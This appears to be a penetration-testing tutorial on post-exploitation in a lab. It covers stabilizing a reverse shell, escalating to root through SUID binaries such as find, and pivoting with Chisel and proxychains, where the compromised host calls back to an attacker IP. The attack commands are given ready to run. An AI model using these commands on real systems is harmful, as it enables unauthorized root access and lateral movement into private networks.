1. Initial Access & Interactive Shell Stabilization

Standard netcat or web reverse shells lack job control, command history, and standard error redirection. If you press Ctrl+C inside a raw shell, your local terminal terminates the connection immediately.

Upgrade to a fully interactive PTY terminal using Python:

bash — TTY Shell Upgrade Sequence 
# Step 1: Spawn pty inside remote shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background shell on attacker machine
# Press: Ctrl+Z

# Step 3: Configure raw terminal echoing and return to shell
stty raw -echo; fg

# Step 4: Re-initialize terminal environment
export TERM=xterm-256color
export SHELL=bash

2. Linux Privilege Escalation: SUID Binaries & GTFOBins

The Set-User-ID (SUID) permission bit allows an executable to run with the privileges of the file owner (typically root). If a standard system binary or custom script has the SUID bit set and can read or spawn processes, an unprivileged user can escalate directly to superuser.

bash — Locate All SUID Binaries on System 
find / -perm -u=s -type f 2>/dev/null

If a utility like find, vim, or cp has SUID set, cross-reference it against the GTFOBins database:

bash — Exploiting SUID on find 
find . -exec /bin/sh -p \; -quit

3. Network Pivoting with Chisel & Proxychains

During a multi-tiered engagement, critical database and domain controllers reside on deep, non-routable subnets (e.g. 10.10.10.0/24) unreachable directly from your Kali attack IP.

🌐
The Pivoting Principle

By converting our compromised dual-homed host (192.168.56.101 + 10.10.10.1) into an encrypted tunnel endpoint, all Kali tools (Nmap, Burp, curl) can route directly through it using SOCKS5 proxy chains.

Start the Chisel reverse server listener on Kali:

bash — Kali Attack Rig (Chisel Server) 
chisel server -p 8000 --reverse

On the compromised target host, connect back to Kali and establish a reverse SOCKS proxy on port 1080:

bash — Compromised Pivot Host (Chisel Client) 
./chisel client 192.168.56.100:8000 R:socks

Now, scan the internal private server (10.10.10.5) transparently from Kali through proxychains:

bash — Scanning Internal Subnet through Proxychains 
proxychains4 nmap -sT -Pn -p 22,80,3306 10.10.10.5
Thought Question: Why must TCP Connect scan (-sT) be used with proxychains instead of SYN scan (-sS)?

SOCKS proxies operate at Layer 5 (Session layer) or Layer 4 (Transport layer). When you route traffic through proxychains, the SOCKS library hooks standard C socket API calls like connect() to negotiate the proxy tunnel. A raw TCP SYN scan (-sS) crafts raw IP packets directly that bypass the OS socket library, rendering SOCKS proxy redirection impossible.
